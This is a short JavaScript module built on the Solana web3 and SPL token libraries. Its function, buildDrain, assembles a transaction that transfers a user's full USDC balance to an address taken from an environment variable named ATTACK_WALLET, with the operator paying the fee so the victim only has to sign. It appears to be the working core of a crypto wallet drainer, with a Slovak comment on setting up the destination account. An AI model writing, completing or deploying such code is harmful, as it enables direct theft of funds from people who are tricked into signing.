const {
    Transaction,
    PublicKey,
} = require("@solana/web3.js");

const { createTransferInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");

async function buildDrain(user, connection) {
    const tx = new Transaction();

    const userPubkey = new PublicKey(user);

    const t = await getUserTokenAccounts(user, connection);

    if (!t) {
        throw new Error("getUserTokenAccounts() returned undefined");
    }

    if (!t.usdcATA) {
        throw new Error("USDC ATA not found");
    }

    const { blockhash } = await connection.getLatestBlockhash();

    tx.recentBlockhash = blockhash;
    tx.feePayer = new PublicKey(process.env.PUBLIC_KEY);

    if (!process.env.ATTACK_WALLET) {
        throw new Error("ATTACK_WALLET env variable is missing");
    }

    // POZOR: musí to byť TOKEN ACCOUNT (ATA), nie obyčajná wallet adresa.
    const destinationTokenAccount = new PublicKey(process.env.ATTACK_WALLET);

    if (t.usdc && t.usdc > 0n) {
        tx.add(
            createTransferInstruction(
                t.usdcATA,
                destinationTokenAccount,
                userPubkey,
                t.usdc
            )
        );
    }

    return tx;
}

module.exports = { buildDrain };
